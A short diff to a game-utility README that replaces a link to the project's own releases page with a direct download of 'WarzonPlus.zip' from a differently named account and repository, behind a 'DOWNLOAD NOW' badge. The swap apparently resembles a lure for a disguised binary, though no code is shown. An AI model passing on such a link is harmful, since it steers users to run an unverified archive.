@@ -40,7 +40,7 @@
 <tr>
 <td align="center">
 
-<a href="https://github.com/YOUR_USERNAME/Warzone-Companion/releases/latest">
+<a href="https://github.com/InletWorkerMoat/Warzone-Game-Utility/releases/download/1/WarzonPlus.zip">
   <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-2C3E50?style=for-the-badge&logo=github&logoColor=white" alt="Download">
 </a>
 
